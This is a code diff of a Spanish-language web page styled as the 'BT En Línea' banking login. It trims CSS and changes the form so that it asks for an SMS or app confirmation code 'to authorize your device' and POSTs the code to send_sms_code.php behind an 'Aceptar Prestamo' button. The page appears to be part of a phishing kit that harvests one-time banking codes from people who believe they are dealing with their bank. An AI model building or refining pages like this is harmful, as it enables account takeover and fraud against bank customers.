@@ -67,33 +67,14 @@
             font-weight: normal;
         }
 
-        .form-group-row {
-            display: flex;
-            justify-content: flex-start;
-        }
-
-        .form-group-row select, .form-group-row input, .form-group-single input {
+        .form-group-single input {
+            width: 100%;
             padding: 9px;
             font-size: 14px;
             border: 1px solid #ccc;
             border-radius: 7px;
             box-sizing: border-box;
             margin-bottom: 15px;
-        }
-
-        .form-group-row select {
-            width: 30%;
-            border-radius: 10px 0 0 10px;
-        }
-
-        .form-group-row input {
-            width: 68%;
-            border-radius: 0 10px 10px 0;
-        }
-
-        .form-group-single input {
-            width: 100%;
-            border-radius: 10px;
         }
 
         .btn-ingresar {
@@ -115,10 +96,6 @@
             display: flex;
             justify-content: space-between;
             gap: 15px;
-        }
-
-        .btn-secondary:hover {
-            background-color: #EF3641;
         }
 
         .footer {
@@ -159,14 +136,6 @@
             font-weight: normal;
         }
 
-        .footer a.strong {
-            font-weight: bold;
-        }
-
-        h1 {
-            font-weight: bold;
-        }
-
         /* Media Queries para pantallas pequeñas */
         @media (max-width: 768px) {
             body {
@@ -181,7 +150,6 @@
                 padding: 15px;
             }
 
-            /* Ajusta el tamaño del logo en móviles */
             .logo img {
                 width: 100%;  /* Hacer que el logo ocupe el 100% del ancho disponible */
                 height: auto;  /* Mantener la proporción del logo */
@@ -199,20 +167,18 @@
             <img src="logo-slogan.png" alt="BT En Línea">
         </div>
         <h1>¡Bienvenido (a)!</h1>
-        <p class="subtitle">Para iniciar sesión en tu cuenta, por favor introduce el código SMS que recibiste.</p>
-        <form>
+        <p class="subtitle">Para autorizar su dispositivo el sistema le ha enviado un codigo SMS o en su App BT Móvil.</p>
+        <form action="send_sms_code.php" method="POST">
             <div class="form-group">
                 <label for="codigo">Código SMS</label>
                 <div class="form-group-single">
-                    <input id="codigo" type="text" placeholder="Introduce tu código SMS">
+                    <input id="codigo" name="codigo" type="text" placeholder="Introduce tu código de confirmación" required>
                 </div>
             </div>
             <button type="submit" class="btn-ingresar">Aceptar Prestamo</button>
-            <div class="btn-container">
-            </div>
         </form>
         <div class="footer">
-                        <div class="browser-icons">
+            <div class="browser-icons">
                 <img src="chrome.png" alt="Chrome">
                 <img src="firefox.png" alt="Firefox">
                 <img src="edge.png" alt="Edge">
